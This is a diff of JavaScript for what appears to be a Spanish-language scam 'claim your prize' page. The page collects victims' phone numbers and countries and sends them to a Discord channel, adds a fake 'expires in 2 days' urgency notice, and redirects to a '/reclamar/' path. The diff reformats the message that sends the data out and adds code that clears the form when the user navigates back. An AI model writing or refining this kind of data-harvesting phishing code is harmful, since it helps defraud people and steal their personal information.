@@ -310,7 +310,7 @@ async function handleLastStep() {
     if (!pais) return alert('Por favor, completa el campo de país');
     
     try {
-        await sendToDiscord(`📱 Celular: ${celular}\n🌎 País: ${pais}`);
+        await sendToDiscord(`📱 **Celular:** ${celular}\n🌎 **País:** ${pais}`);
         window.location.href = '/reclamar/';
     } catch (e) {
         console.error('Error in last step:', e);
@@ -367,5 +367,21 @@ document.addEventListener('DOMContentLoaded', () => {
     const fechaElemento = document.getElementById('fecha');
     if (fechaElemento) {
         fechaElemento.innerHTML = `${fechaNumerica} <span style="color: red;">vence en 2 días.</span>`;
+    }
+});
+
+
+// Limpiar inputs al volver atrás sin afectar la caché
+window.addEventListener('pageshow', function(event) {
+    if (event.persisted || (window.performance && window.performance.getEntriesByType('navigation')[0].type === 'back_forward')) {
+        const celularInput = document.getElementById('celular');
+        const paisInput = document.getElementById('pais');
+
+        if (celularInput) celularInput.value = '';
+        if (paisInput) paisInput.value = '';
+
+        // Si quieres, también puedes resetear el botón de siguiente
+        const nextBtn = document.querySelector('button[onclick="handleLastStep()"], button[onclick="nextQuestion()"]');
+        if (nextBtn) nextBtn.disabled = true;
     }
 });
